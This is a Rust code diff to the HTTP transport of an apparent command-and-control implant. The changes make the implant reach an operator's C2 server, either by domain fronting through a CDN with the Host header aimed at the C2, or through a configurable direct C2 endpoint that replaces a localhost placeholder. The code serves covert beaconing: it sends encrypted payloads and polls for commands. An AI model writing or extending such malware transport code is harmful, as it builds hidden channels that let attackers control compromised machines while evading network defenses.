@@ -65,9 +65,14 @@ impl Transport for HttpTransport {
         log::debug!("Malleable HTTP C2 Send with profile User-Agent: {}", self.profile.user_agent);
 
         let endpoint = if self.profile.cdn_relay {
-            format!("https://{}", self.profile.host_header) // Connect to actual C2 bypassing relay if direct? No, domain fronting logic: connect to CDN, host header points to C2
+            // Domain-fronting: connect to CDN IP/host, Host header points to C2.
+            format!("https://{}", self.profile.host_header)
         } else {
-            "https://127.0.0.1".to_string() // Dummy
+            // Direct C2: operator must configure direct_c2_endpoint.
+            if self.profile.direct_c2_endpoint.is_empty() {
+                anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
+            }
+            self.profile.direct_c2_endpoint.clone()
         };
 
         // Serialize and encrypt payload
@@ -83,11 +88,14 @@ impl Transport for HttpTransport {
     
     async fn recv(&mut self) -> Result<Message> {
         log::debug!("Malleable HTTP C2 Recv polling via GET");
-        
+
         let endpoint = if self.profile.cdn_relay {
             format!("https://{}", self.profile.host_header)
         } else {
-            "https://127.0.0.1".to_string() // Dummy
+            if self.profile.direct_c2_endpoint.is_empty() {
+                anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
+            }
+            self.profile.direct_c2_endpoint.clone()
         };
 
         let req = self.client.get(format!("{}{}", endpoint, self.profile.uri));
